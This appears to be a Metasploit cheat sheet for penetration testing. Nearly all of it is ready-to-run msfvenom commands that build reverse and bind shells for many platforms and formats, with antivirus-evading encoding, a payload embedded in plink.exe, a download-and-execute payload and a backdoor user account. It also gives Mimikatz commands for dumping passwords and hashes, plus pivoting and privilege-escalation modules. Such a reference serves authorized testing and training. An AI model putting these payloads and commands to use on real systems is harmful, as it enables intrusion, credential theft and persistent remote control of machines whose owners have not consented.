## msfvenom
-----

#### var name "payload" and type python, windows non-staged reverse shell
-----
```msfvenom -p windows/shell_reverse_tcp -f py --var-name payload LHOST=10.11.0.111 LPORT=7171```


#### windows non-staged reverse shell, x86, C, exclude x00,x0a,x0d, encode shikata
-----
```msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.111 LPORT=4448 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai```


#### windows staged reverse shell, output to shell.exe
-----
```msfvenom -p windows/shell/reverse_tcp LHOST=10.11.0.111 LPORT=4447 -f exe -o shell.exe```


#### linux x86, python, staged meterpreter
-----
```msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.111 LPORT=6969 -f python```


#### windows non-staged meterpreter reverse shell, VBScript
-----
```msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.0.103 LPORT=4444 EXITFUNC=thread -f vbs --arch x86 --platform win```


#### windows aspx non-staged reverse shell
-----
```msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=10.11.0.111 LPORT=4450 -e x86/shikata_ga_nai -o shell.aspx```


#### PHP meterpreter staged reverse shell
-----
```msfvenom -p php/meterpreter/reverse_tcp LHOST=10.11.0.111 LPORT=4443 -f raw -o shell.php```


#### Java WAR non-staged reverse shell
-----
```msfvenom -p java/shell_reverse_tcp LHOST=10.11.0.111 LPORT=4443 -f war -o shell.war```


#### linux x86 bind shell, shikata encoded, excluded values
-----
```msfvenom -p linux/x86/shell_bind_tcp LPORT=4443 -f c -b “\x00\x0a\x0d\x20” -e x86/shikata_ga_nai```


#### FreeBSD ELF reverse shell, non-staged
-----
```msfvenom -p bsd/x64/shell_reverse_tcp LHOST=10.11.0.111 LPORT=4443 -f elf -o shell.elf```


#### Linux non-staged reverse shell (shellcode)
-----
```msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.111 LPORT=4443 -e x86/shikata_ga_nai -f c```


#### Windows Python non-staged reverse shell
-----
```msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.111 LPORT=4443 EXITFUNC=thread -f python -o shell.py```


#### Windows Javascript non-staged reverse shell with NOPs
-----
```msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.111 LPORT=4443 -f js_le -e generic/none -n 18```


#### Windows Powershell non-staged reverse shell
-----
```msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.111 LPORT=4443 -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1```


#### Windows x64 non-staged reverse shell
-----
```msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.0.111 LPORT=4443 -f exe -o shell.exe```


#### Windows non-staged reverse shell embedded into plink
-----
```msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.111 LPORT=4443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe```


#### Download and execute (windows)
-----
```msfvenom -p windows/download_exec URL=http://10.11.0.111/malware.exe -f py --var-name shellcode```


#### Create user (windows)
-----
```msfvenom -p windows/adduser USER=hacker PASS=Hacker123$ -f exe > adduser.exe```


## Mimikatz
-----

#### Password and Hash gathering (windows)
-----
*In meterpreter session*
```
load mimikatz
msv
mimikatz_command -f samdump::hashes
mimikatz_command -f sekurlsa::searchPasswords
```


## Other
-----

#### SOCKS4 proxy through target
-----
```
run autoroute -s 10.1.1.0/24
run autoroute -p
use auxiliary/scanner/portscan/tcp 
auxiliary/server/socks4a
```


#### Attempt to connect back on all ports (when unsure of egress rules)
-----
```payload/reverse_tcp_allports```


#### Set global parameters
-----
```setg```


#### add nmap scan to database
-----
```db_nmap 10.11.1.0/24 --top-ports 20```


#### post exploitation / privesc
-----
```post/multi/recon/local_exploit_suggester```




